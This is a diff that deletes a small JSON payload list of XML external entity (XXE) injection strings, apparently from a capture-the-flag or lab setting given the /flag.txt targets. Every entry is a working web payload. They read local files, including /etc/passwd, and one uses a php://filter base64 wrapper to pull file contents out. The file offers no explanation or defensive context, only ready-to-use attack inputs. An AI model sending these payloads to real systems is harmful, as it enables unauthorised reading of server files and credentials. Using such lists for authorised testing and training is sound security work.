@@ -1,9 +1,0 @@
-{
-  "file_read": [
-    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
-    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///flag.txt\">]><root>&xxe;</root>"
-  ],
-  "php_filter": [
-    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/flag.txt\">]><root>&xxe;</root>"
-  ]
-}
